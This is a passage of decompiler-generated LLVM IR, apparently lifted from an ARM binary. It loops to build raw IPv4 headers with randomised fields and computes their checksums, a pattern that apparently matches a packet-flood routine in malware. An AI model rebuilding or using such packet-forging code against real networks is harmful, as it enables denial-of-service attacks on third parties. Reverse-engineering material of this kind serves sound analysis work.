  %v5_ab5c = mul i32 %v2_ab5c, 4
  %v6_ab5c = add i32 %v5_ab5c, %v2_a8b0
  %v7_ab5c = inttoptr i32 %v6_ab5c to i32*
  store i32 %v2_ab50, i32* %v7_ab5c, align 4
  %v0_ab60 = load i32, i32* %r1.global-to-local, align 4
  %v1_ab60 = load i32, i32* %r3.global-to-local, align 4
  %v4_ab60 = mul i32 %v1_ab60, 4
  %v5_ab60 = add i32 %v4_ab60, %v0_ab60
  %v6_ab60 = inttoptr i32 %v5_ab60 to i32*
  %v7_ab60 = load i32, i32* %v6_ab60, align 4
  store i32 %v7_ab60, i32* %r4.global-to-local, align 4
  %v1_ab64 = inttoptr i32 %v7_ab60 to i8*
  %v2_ab64 = load i8, i8* %v1_ab64, align 1
  %tmp = urem i8 %v2_ab64, 16
  %v1_ab68 = zext i8 %tmp to i32
  %v1_ab6c = or i32 %v1_ab68, 64
  store i32 %v1_ab6c, i32* %r2.global-to-local, align 4
  %v1_ab70 = trunc i32 %v1_ab6c to i8
  store i8 %v1_ab70, i8* %v1_ab64, align 1
  %v0_ab74 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab74 = inttoptr i32 %v0_ab74 to i8*
  %v2_ab74 = load i8, i8* %v1_ab74, align 1
  %v1_ab78 = and i8 %v2_ab74, -16
  %v1_ab7c = or i8 %v1_ab78, 5
  store i32 %v1_a930, i32* %r2.global-to-local, align 4
  store i8 %v1_ab7c, i8* %v1_ab74, align 1
  %v2_ab8c = load i32, i32* %r4.global-to-local, align 4
  %v3_ab8c = add i32 %v2_ab8c, 1
  %v4_ab8c = inttoptr i32 %v3_ab8c to i8*
  store i8 %v5_a8e8, i8* %v4_ab8c, align 1
  store i32 %v4_ab90, i32* %r1.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_ab98 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab98 = add i32 %v2_ab98, 8
  %v4_ab98 = inttoptr i32 %v3_ab98 to i8*
  store i8 %v5_a920, i8* %v4_ab98, align 1
  %v0_ab9c = load i32, i32* %r2.global-to-local, align 4
  %v1_ab9c = load i32, i32* %ip.global-to-local, align 4
  %v9_ab9c = icmp eq i32 %v0_ab9c, %v1_ab9c
  store i1 %v9_ab9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_aae8, i32* %r3.global-to-local, align 4
  store i32 %v4_aaa4, i32* %r2.global-to-local, align 4
  %v2_aba8 = load i32, i32* %r4.global-to-local, align 4
  %v3_aba8 = add i32 %v2_aba8, 3
  %v4_aba8 = inttoptr i32 %v3_aba8 to i8*
  store i8 %v5_aafc, i8* %v4_aba8, align 1
  %v0_abac = load i32, i32* %r2.global-to-local, align 4
  %v1_abac = trunc i32 %v0_abac to i8
  %v2_abac = load i32, i32* %r4.global-to-local, align 4
  %v3_abac = add i32 %v2_abac, 2
  %v4_abac = inttoptr i32 %v3_abac to i8*
  store i8 %v1_abac, i8* %v4_abac, align 1
  %v0_abb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abb0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_ab44
  store i32 %v3_ab0c, i32* %r2.global-to-local, align 4
  %extract.t114 = trunc i32 %v3_ab0c to i8
  br label %bb94

bb:                                               ; preds = %dec_label_pc_ab44
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v3_ab0c, i32* %r2.global-to-local, align 4
  %v3_abb8 = load i32, i32* %r4.global-to-local, align 4
  %v4_abb8 = add i32 %v3_abb8, 6
  %v5_abb8 = inttoptr i32 %v4_abb8 to i8*
  store i8 64, i8* %v5_abb8, align 1
  %v0_abc0.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t115 = trunc i32 %v0_abc0.pre to i8
  br label %bb94

bb94:                                             ; preds = %.thread, %bb
  %v3_ab0c.sink.off0 = phi i8 [ %extract.t114, %.thread ], [ %extract.t115, %bb ]
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_abc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_abc0 = add i32 %v2_abc0, 5
  %v4_abc0 = inttoptr i32 %v3_abc0 to i8*
  store i8 %v3_ab0c.sink.off0, i8* %v4_abc0, align 1
  store i32 %v3_ab04, i32* %r1.global-to-local, align 4
  %v0_abc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abc8, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_abc8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_abc8, i32* %r2.global-to-local, align 4
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_abcc = load i32, i32* %r3.global-to-local, align 4
  %v1_abcc = trunc i32 %v0_abcc to i8
  %v2_abcc = load i32, i32* %r4.global-to-local, align 4
  %v3_abcc = add i32 %v2_abcc, 9
  %v4_abcc = inttoptr i32 %v3_abcc to i8*
  store i8 %v1_abcc, i8* %v4_abcc, align 1
  %v0_abd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abd0, label %bb98, label %bb97

bb97:                                             ; preds = %bb96
  %v1_abd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_abd0 = trunc i32 %v1_abd0 to i8
  %v3_abd0 = load i32, i32* %r4.global-to-local, align 4
  %v4_abd0 = add i32 %v3_abd0, 7
  %v5_abd0 = inttoptr i32 %v4_abd0 to i8*
  store i8 %v2_abd0, i8* %v5_abd0, align 1
  br label %bb98

bb98:                                             ; preds = %bb96, %bb97
  %v3_abd4 = load i32, i32* %stack_var_-40, align 4
  %v5_abdc = mul i32 %v3_abd4, 24
  store i32 %v5_abdc, i32* %r3.global-to-local, align 4
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  %v1_abe4 = load i32, i32* %r4.global-to-local, align 4
  %v2_abe4 = add i32 %v1_abe4, 12
  %v3_abe4 = inttoptr i32 %v2_abe4 to i32*
  store i32 %v5_a9d0, i32* %v3_abe4, align 4
  %v0_abe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abe8 = load i32, i32* @sb, align 4
  %v2_abe8 = add i32 %v1_abe8, %v0_abe8
  store i32 %v2_abe8, i32* %r3.global-to-local, align 4
  %v1_abec = add i32 %v2_abe8, 16
  %v2_abec = inttoptr i32 %v1_abec to i32*
  %v3_abec = load i32, i32* %v2_abec, align 4
  store i32 %v3_abec, i32* %r2.global-to-local, align 4
  %v0_abf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_abf0 = trunc i32 %v0_abf0 to i8
  %v2_abf0 = load i32, i32* %r4.global-to-local, align 4
  %v3_abf0 = add i32 %v2_abf0, 4
  %v4_abf0 = inttoptr i32 %v3_abf0 to i8*
  store i8 %v1_abf0, i8* %v4_abf0, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_abf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_abf8 = add i32 %v0_abf8, 20
  store i32 %v1_abf8, i32* %r1.global-to-local, align 4
  %v3_abfc = add i32 %v0_abf8, 22
  %v4_abfc = inttoptr i32 %v3_abfc to i8*
  store i8 101, i8* %v4_abfc, align 1
  %v0_ac00 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac00 = load i32, i32* %r4.global-to-local, align 4
  %v2_ac00 = add i32 %v1_ac00, 16
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v0_ac00, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 24
  store i32 %v1_ac04, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_ac0c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac0c = add i32 %v0_ac0c, -93
  store i32 %v1_ac0c, i32* %r3.global-to-local, align 4
  %v2_ac10 = load i32, i32* %r1.global-to-local, align 4
  %v3_ac10 = add i32 %v2_ac10, 3
  %v4_ac10 = inttoptr i32 %v3_ac10 to i8*
  store i8 88, i8* %v4_ac10, align 1
  %v0_ac14 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i8
  %v2_ac14 = load i32, i32* %r0.global-to-local, align 4
  %v3_ac14 = add i32 %v2_ac14, 12
  %v4_ac14 = inttoptr i32 %v3_ac14 to i8*
  store i8 %v1_ac14, i8* %v4_ac14, align 1
  %v0_ac18 = load i32, i32* %ip.global-to-local, align 4
  %v1_ac18 = trunc i32 %v0_ac18 to i8
  %v2_ac18 = load i32, i32* %r0.global-to-local, align 4
  %v3_ac18 = add i32 %v2_ac18, 13
  %v4_ac18 = inttoptr i32 %v3_ac18 to i8*
  store i8 %v1_ac18, i8* %v4_ac18, align 1
  %v0_ac1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac1c = add i32 %v0_ac1c, 38
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %tmp116 = urem i8 %v3_ac1c, 16
  %v1_ac20 = zext i8 %tmp116 to i32
  %v1_ac24 = or i32 %v1_ac20, 64
  store i32 %v1_ac24, i32* %r3.global-to-local, align 4
  %v1_ac28 = trunc i32 %v1_ac24 to i8
  store i8 %v1_ac28, i8* %v2_ac1c, align 1
  %v0_ac2c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac2c = add i32 %v0_ac2c, 38
  %v2_ac2c = inttoptr i32 %v1_ac2c to i8*
  %v3_ac2c = load i8, i8* %v2_ac2c, align 1
  %v1_ac30 = and i8 %v3_ac2c, -16
  %v1_ac34 = or i8 %v1_ac30, 5
  store i8 %v1_ac34, i8* %v2_ac2c, align 1
  %v0_ac40 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac40 = add i32 %v0_ac40, 38
  store i32 %v1_ac40, i32* @r5, align 4
  %v3_ac44 = add i32 %v0_ac40, 39
  %v4_ac44 = inttoptr i32 %v3_ac44 to i8*
  store i8 %v5_a8e8, i8* %v4_ac44, align 1
  store i32 %v7_ab04, i32* %r1.global-to-local, align 4
  store i32 %tmp91, i32* %r3.global-to-local, align 4
  store i32 %v3_ab10, i32* %r2.global-to-local, align 4
  %v2_ac54 = load i32, i32* @r5, align 4
  %v3_ac54 = add i32 %v2_ac54, 4
  %v4_ac54 = inttoptr i32 %v3_ac54 to i8*
  store i8 %v5_aad4, i8* %v4_ac54, align 1
  %v0_ac58 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i8
  %v2_ac58 = load i32, i32* @r5, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i8*
  store i8 %v1_ac58, i8* %v4_ac58, align 1
  %v0_ac5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac5c, label %bb100, label %bb99

bb99:                                             ; preds = %bb98
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb100

bb100:                                            ; preds = %bb98, %bb99
  store i32 %v3_ab14, i32* %r1.global-to-local, align 4
  %v0_ac64 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac64 = trunc i32 %v0_ac64 to i8
  %v2_ac64 = load i32, i32* @r5, align 4
  %v3_ac64 = add i32 %v2_ac64, 3
  %v4_ac64 = inttoptr i32 %v3_ac64 to i8*
  store i8 %v1_ac64, i8* %v4_ac64, align 1
  store i32 %v4_ab90, i32* %r2.global-to-local, align 4
  %v0_ac6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac6c, label %bb102, label %bb101

bb101:                                            ; preds = %bb100
  %v1_ac6c = load i32, i32* %r3.global-to-local, align 4
  %v2_ac6c = trunc i32 %v1_ac6c to i8
  %v3_ac6c = load i32, i32* @r5, align 4
  %v4_ac6c = add i32 %v3_ac6c, 6
  %v5_ac6c = inttoptr i32 %v4_ac6c to i8*
  store i8 %v2_ac6c, i8* %v5_ac6c, align 1
  br label %bb102

bb102:                                            ; preds = %bb100, %bb101
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac74 = trunc i32 %v0_ac74 to i8
  %v2_ac74 = load i32, i32* @r5, align 4
  %v3_ac74 = add i32 %v2_ac74, 5
  %v4_ac74 = inttoptr i32 %v3_ac74 to i8*
  store i8 %v1_ac74, i8* %v4_ac74, align 1
  %v0_ac78 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac78 = trunc i32 %v0_ac78 to i8
  %v2_ac78 = load i32, i32* @r5, align 4
  %v3_ac78 = add i32 %v2_ac78, 8
  %v4_ac78 = inttoptr i32 %v3_ac78 to i8*
  store i8 %v1_ac78, i8* %v4_ac78, align 1
  %v0_ac7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac7c, label %bb104, label %bb103

bb103:                                            ; preds = %bb102
  %v1_ac7c = load i32, i32* %ip.global-to-local, align 4
  %v2_ac7c = trunc i32 %v1_ac7c to i8
  %v3_ac7c = load i32, i32* @r5, align 4
  %v4_ac7c = add i32 %v3_ac7c, 7
  %v5_ac7c = inttoptr i32 %v4_ac7c to i8*
  store i8 %v2_ac7c, i8* %v5_ac7c, align 1
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v0_ac80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac80 = trunc i32 %v0_ac80 to i8
  %v2_ac80 = load i32, i32* @r5, align 4
  %v3_ac80 = add i32 %v2_ac80, 9
  %v4_ac80 = inttoptr i32 %v3_ac80 to i8*
  store i8 %v1_ac80, i8* %v4_ac80, align 1
  %v0_ac84 = call i32 @function_fe60()
  store i32 %v0_ac84, i32* %r0.global-to-local, align 4
  store i32 %v1_aa2c, i32* %r1.global-to-local, align 4
  store i1 %v2_ac90, i1* %cpsr_z.global-to-local, align 1
  %v1_ac94 = sub i32 1023, %v0_ac84
  store i32 %v1_ac94, i32* %r3.global-to-local, align 4
  br i1 %v2_ac90, label %.thread21, label %.thread22

.thread21:                                        ; preds = %bb104
  %v2_ac9c = load i32, i32* @r5, align 4
  %v3_ac9c = add i32 %v2_ac9c, 16
  %v4_ac9c = inttoptr i32 %v3_ac9c to i32*
  store i32 %v1_ac94, i32* %v4_ac9c, align 4
  br label %bb105

.thread22:                                        ; preds = %bb104
  %v1_ac98 = load i32, i32* %r4.global-to-local, align 4
  %v2_ac98 = add i32 %v1_ac98, 16
  %v3_ac98 = inttoptr i32 %v2_ac98 to i32*
  %v4_ac98 = load i32, i32* %v3_ac98, align 4
  store i32 %v4_ac98, i32* %r3.global-to-local, align 4
  %v2_aca0 = load i32, i32* @r5, align 4
  %v3_aca0 = add i32 %v2_aca0, 16
  %v4_aca0 = inttoptr i32 %v3_aca0 to i32*
  store i32 %v4_ac98, i32* %v4_aca0, align 4
  br label %bb105

bb105:                                            ; preds = %.thread21, %.thread22
  store i32 %v4_aca4, i32* %r3.global-to-local, align 4
  %v0_aca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aca8 = add i32 %v0_aca8, 58
  store i32 %v1_aca8, i32* @r6, align 4
  %v1_acac = load i32, i32* @r5, align 4
  %v2_acac = add i32 %v1_acac, 12
  %v3_acac = inttoptr i32 %v2_acac to i32*
  store i32 %v0_ac84, i32* %v3_acac, align 4
  %v0_acb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_acb0 = trunc i32 %v0_acb0 to i8
  %v2_acb0 = load i32, i32* @r6, align 4
  %v3_acb0 = add i32 %v2_acb0, 1
  %v4_acb0 = inttoptr i32 %v3_acb0 to i8*
  store i8 %v1_acb0, i8* %v4_acb0, align 1
  %v3_acb4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_acb4, i32* %r3.global-to-local, align 4
  store i32 %v4_acb8, i32* %r2.global-to-local, align 4
  %v1_acbc = add i32 %v3_acb4, 1
  store i32 %v1_acbc, i32* @r4, align 4
  store i32 %v4_acc0, i32* %r1.global-to-local, align 4
  %v1_acc4 = load i32, i32* @fp, align 4
  %v9_acc4 = icmp eq i32 %v1_acbc, %v1_acc4
  store i1 %v9_acc4, i1* %cpsr_z.global-to-local, align 1
  %v2_acc8 = load i32, i32* @r6, align 4
  %v3_acc8 = add i32 %v2_acc8, 5
  %v4_acc8 = inttoptr i32 %v3_acc8 to i8*
  store i8 %v1_acc8, i8* %v4_acc8, align 1
  %v0_accc = load i32, i32* @r7, align 4
  %v1_accc = trunc i32 %v0_accc to i8
  %v2_accc = load i32, i32* @r6, align 4
  %v3_accc = inttoptr i32 %v2_accc to i8*
  store i8 %v1_accc, i8* %v3_accc, align 1
  %v0_acd0 = load i32, i32* %sl.global-to-local, align 4
  %v1_acd0 = trunc i32 %v0_acd0 to i8
  %v2_acd0 = load i32, i32* @r6, align 4
  %v3_acd0 = add i32 %v2_acd0, 2
  %v4_acd0 = inttoptr i32 %v3_acd0 to i8*
  store i8 %v1_acd0, i8* %v4_acd0, align 1
  %v0_acd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_acd4 = trunc i32 %v0_acd4 to i8
  %v2_acd4 = load i32, i32* @r6, align 4
  %v3_acd4 = add i32 %v2_acd4, 3
  %v4_acd4 = inttoptr i32 %v3_acd4 to i8*
  store i8 %v1_acd4, i8* %v4_acd4, align 1
  %v0_acd8 = load i32, i32* %r8.global-to-local, align 4
  %v1_acd8 = trunc i32 %v0_acd8 to i8
  %v2_acd8 = load i32, i32* @r6, align 4
  %v3_acd8 = add i32 %v2_acd8, 4
  %v4_acd8 = inttoptr i32 %v3_acd8 to i8*
  store i8 %v1_acd8, i8* %v4_acd8, align 1
  %v0_acdc = load i32, i32* @r4, align 4
  store i32 %v0_acdc, i32* %stack_var_-40, align 4
  %v5_ace0 = icmp slt i32 %v1_acbc, %v1_acc4
  br i1 %v5_ace0, label %dec_label_pc_ab44, label %dec_label_pc_ace4

dec_label_pc_ace4:                                ; preds = %bb105
  %v1_acec = add i32 %v5_a97c, 8
  store i32 %v1_acec, i32* %r2.global-to-local, align 4
  %v1_acf0 = add i32 %v5_a97c, 66
  store i32 %v1_acf0, i32* %r3.global-to-local, align 4
  %v0_acfc.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_acfc.preheader

dec_label_pc_acfc.preheader:                      ; preds = %dec_label_pc_ace4, %dec_label_pc_afec
  %v0_acfc.pre = phi i32 [ %v0_acfc.pre.pre, %dec_label_pc_ace4 ], [ %v0_aa40, %dec_label_pc_afec ]
  %stack_var_-160.0.ph = phi i32 [ %v1_acf0, %dec_label_pc_ace4 ], [ %v1_aff8, %dec_label_pc_afec ]
  %stack_var_-156.0.ph = phi i32 [ %v1_acec, %dec_label_pc_ace4 ], [ %v1_aff4, %dec_label_pc_afec ]
  %v3_af4c = icmp eq i32 %v3_aa34, 65535
  %v2_afbc = icmp eq i32 %v1_aa2c, 0
  %v2_ada0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_adb8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_adc8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_add4 = ptrtoint i32* %stack_var_-50 to i32
  %v2_ade8 = icmp eq i32 %v1_a99c, 0
  %v2_ad44 = icmp eq i32 %v5_a9d0, -1
  %v7_ad44 = icmp eq i32 %v5_a9d0, -1
  br label %dec_label_pc_acfc

dec_label_pc_acfc:                                ; preds = %dec_label_pc_adf0, %dec_label_pc_acfc.preheader
  %v0_acfc = phi i32 [ %v0_acfc.pre, %dec_label_pc_acfc.preheader ], [ %v1_aeb4, %dec_label_pc_adf0 ]
  %v2_acfc = icmp eq i32 %v0_acfc, 0
  store i1 %v2_acfc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp106 = icmp slt i32 %v0_acfc, 1
  br label %dec_label_pc_ad04

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ad04, %dec_label_pc_acfc
  br i1 %tmp106, label %dec_label_pc_ad04, label %dec_label_pc_ad08

dec_label_pc_ad08:                                ; preds = %dec_label_pc_ad04
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_ad14

dec_label_pc_ad14:                                ; preds = %dec_label_pc_adf0, %dec_label_pc_ad08
  %v1_ad28 = phi i32 [ %v1_aeb0, %dec_label_pc_adf0 ], [ 0, %dec_label_pc_ad08 ]
  %v5_ad18 = mul i32 %v1_ad28, 24
  %v1_ad1c = load i32, i32* @sb, align 4
  %v2_ad1c = add i32 %v1_ad1c, %v5_ad18
  store i32 %v2_ad1c, i32* %r3.global-to-local, align 4
  store i32 %v2_a8b0, i32* %r1.global-to-local, align 4
  %v1_ad24 = add i32 %v2_ad1c, 20
  %v2_ad24 = inttoptr i32 %v1_ad24 to i8*
  %v3_ad24 = load i8, i8* %v2_ad24, align 1
  %v4_ad24 = zext i8 %v3_ad24 to i32
  store i32 %v4_ad24, i32* %r2.global-to-local, align 4
  %v4_ad28 = mul i32 %v1_ad28, 4
  %v5_ad28 = add i32 %v4_ad28, %v2_a8b0
  %v6_ad28 = inttoptr i32 %v5_ad28 to i32*
  %v7_ad28 = load i32, i32* %v6_ad28, align 4
  store i32 %v7_ad28, i32* @r5, align 4
  %v7_ad2c = icmp eq i8 %v3_ad24, 31
  store i1 %v7_ad2c, i1* %cpsr_z.global-to-local, align 1
  %v1_ad30 = add i32 %v7_ad28, 24
  store i32 %v1_ad30, i32* @r8, align 4
  %v1_ad34 = add i32 %v7_ad28, 38
  store i32 %v1_ad34, i32* @r6, align 4
  %v1_ad38 = add i32 %v7_ad28, 58
  store i32 %v1_ad38, i32* @r7, align 4
  %tmp117 = icmp ult i8 %v3_ad24, 32
  br i1 %tmp117, label %dec_label_pc_aed4, label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad14
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  store i1 %v7_ad44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad44, label %dec_label_pc_af3c, label %dec_label_pc_ad4c

dec_label_pc_ad4c:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_ad40
  store i32 %v3_aa34, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_af4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_af4c, label %dec_label_pc_af58, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge, %dec_label_pc_ad4c
  %v1_ad64 = phi i32 [ %v1_ad64.pre, %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge ], [ 65535, %dec_label_pc_ad4c ]
  store i32 %v3_aa38, i32* %r1.global-to-local, align 4
  %v9_ad64 = icmp eq i32 %v3_aa38, %v1_ad64
  store i1 %v9_ad64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad64, label %dec_label_pc_af90, label %dec_label_pc_ad6c

dec_label_pc_ad6c:                                ; preds = %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge, %dec_label_pc_ad60
  %v1_ad70 = phi i32 [ %v1_ad70.pre, %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge ], [ %v1_ad64, %dec_label_pc_ad60 ]
  store i32 %v3_aa3c, i32* %r2.global-to-local, align 4
  %v9_ad70 = icmp eq i32 %v3_aa3c, %v1_ad70
  store i1 %v9_ad70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad70, label %dec_label_pc_afac, label %dec_label_pc_ad78

dec_label_pc_ad78:                                ; preds = %dec_label_pc_af90, %dec_label_pc_ad6c
  store i32 %v1_aa2c, i32* %r3.global-to-local, align 4
  store i1 %v2_afbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afbc, label %dec_label_pc_afd0, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_ad78
  %v1_ad80 = load i32, i32* @r5, align 4
  %v2_ad80 = add i32 %v1_ad80, 16
  %v3_ad80 = inttoptr i32 %v2_ad80 to i32*
  %v4_ad80 = load i32, i32* %v3_ad80, align 4
  store i32 %v4_ad80, i32* %r3.global-to-local, align 4
  %v2_ad84 = load i32, i32* @r6, align 4
  %v3_ad84 = add i32 %v2_ad84, 16
  %v4_ad84 = inttoptr i32 %v3_ad84 to i32*
  store i32 %v4_ad80, i32* %v4_ad84, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_ad8c:                                ; preds = %bb109, %.thread23, %dec_label_pc_afd0
  %v0_ad8c = call i32 @function_fe60()
  store i32 %v0_ad8c, i32* %r0.global-to-local, align 4
  store i32 %v0_ad8c, i32* %stack_var_-44, align 4
  %v0_ad94 = call i32 @function_fe60()
  store i32 %v0_ad94, i32* %r0.global-to-local, align 4
  store i32 %v0_ad94, i32* %stack_var_-48, align 4
  %v0_ad9c = call i32 @function_fe60()
  store i32 %v2_ada0, i32* %r1.global-to-local, align 4
  store i32 %v0_ad9c, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_adac = load i32, i32* @r8, align 4
  store i32 %v0_adac, i32* %r0.global-to-local, align 4
  %v3_adb0 = call i32 @function_12d58(i32 %v0_adac, i32 %v2_ada0, i32 4)
  %v0_adb4 = load i32, i32* @r8, align 4
  %v1_adb4 = add i32 %v0_adb4, 6
  store i32 %v1_adb4, i32* %r0.global-to-local, align 4
  store i32 %v2_adb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_adc0 = call i32 @function_12d58(i32 %v1_adb4, i32 %v2_adb8, i32 4)
  %v0_adc4 = load i32, i32* @r8, align 4
  %v1_adc4 = add i32 %v0_adc4, 4
  store i32 %v1_adc4, i32* %r0.global-to-local, align 4
  store i32 %v2_adc8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_add0 = call i32 @function_12d58(i32 %v1_adc4, i32 %v2_adc8, i32 2)
  store i32 %v2_add4, i32* %r1.global-to-local, align 4
  %v0_add8 = load i32, i32* @r8, align 4
  %v1_add8 = add i32 %v0_add8, 10
  store i32 %v1_add8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ade0 = call i32 @function_12d58(i32 %v1_add8, i32 %v2_add4, i32 2)
  store i32 %v3_ade0, i32* %r0.global-to-local, align 4
  store i32 %v1_a99c, i32* %r1.global-to-local, align 4
  store i1 %v2_ade8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ade8, label %dec_label_pc_adf0, label %dec_label_pc_afdc

dec_label_pc_adf0:                                ; preds = %dec_label_pc_ad8c, %dec_label_pc_afdc
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adf4 = load i32, i32* @sl, align 4
  %v1_adf4 = trunc i32 %v0_adf4 to i8
  %v2_adf4 = load i32, i32* @r5, align 4
  %v3_adf4 = add i32 %v2_adf4, 10
  %v4_adf4 = inttoptr i32 %v3_adf4 to i8*
  store i8 %v1_adf4, i8* %v4_adf4, align 1
  %v0_adf8 = load i32, i32* @sl, align 4
  %v1_adf8 = trunc i32 %v0_adf8 to i8
  %v2_adf8 = load i32, i32* @r5, align 4
  %v3_adf8 = add i32 %v2_adf8, 11
  %v4_adf8 = inttoptr i32 %v3_adf8 to i8*
  store i8 %v1_adf8, i8* %v4_adf8, align 1
  %v0_adfc = load i32, i32* @r5, align 4
  store i32 %v0_adfc, i32* @r0, align 4
  %v2_ae00 = call i32 @function_e424(i32 %v0_adfc, i32 20)
  %v3_ae00 = trunc i32 %v2_ae00 to i8
  %v4_ae04 = sdiv i32 %v2_ae00, 256
  store i32 %v4_ae04, i32* %r3.global-to-local, align 4
  %v1_ae08 = trunc i32 %v4_ae04 to i8
  %v2_ae08 = load i32, i32* @r5, align 4
  %v3_ae08 = add i32 %v2_ae08, 11
  %v4_ae08 = inttoptr i32 %v3_ae08 to i8*
  store i8 %v1_ae08, i8* %v4_ae08, align 1
  %v3_ae0c = load i32, i32* @r5, align 4
  %v4_ae0c = add i32 %v3_ae0c, 10
  %v5_ae0c = inttoptr i32 %v4_ae0c to i8*
  store i8 %v3_ae00, i8* %v5_ae0c, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v1_ae14 = trunc i32 %v0_ae14 to i8
  %v2_ae14 = load i32, i32* @r6, align 4
  %v3_ae14 = add i32 %v2_ae14, 10
  %v4_ae14 = inttoptr i32 %v3_ae14 to i8*
  store i8 %v1_ae14, i8* %v4_ae14, align 1
  %v0_ae18 = load i32, i32* @sl, align 4
  %v1_ae18 = trunc i32 %v0_ae18 to i8
  %v2_ae18 = load i32, i32* @r6, align 4
  %v3_ae18 = add i32 %v2_ae18, 11
  %v4_ae18 = inttoptr i32 %v3_ae18 to i8*
  store i8 %v1_ae18, i8* %v4_ae18, align 1
  %v0_ae1c = load i32, i32* @r6, align 4
  store i32 %v0_ae1c, i32* @r0, align 4
  %v2_ae20 = call i32 @function_e424(i32 %v0_ae1c, i32 20)
  %v3_ae20 = trunc i32 %v2_ae20 to i8
  store i32 %v2_ae20, i32* %r0.global-to-local, align 4
  %v4_ae24 = sdiv i32 %v2_ae20, 256
  store i32 %v4_ae24, i32* %r3.global-to-local, align 4
  %v3_ae28 = load i32, i32* @r6, align 4
  %v4_ae28 = add i32 %v3_ae28, 10
  %v5_ae28 = inttoptr i32 %v4_ae28 to i8*
  store i8 %v3_ae20, i8* %v5_ae28, align 1
  %v0_ae2c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae2c = trunc i32 %v0_ae2c to i8
  %v2_ae2c = load i32, i32* @r6, align 4
  %v3_ae2c = add i32 %v2_ae2c, 11
  %v4_ae2c = inttoptr i32 %v3_ae2c to i8*
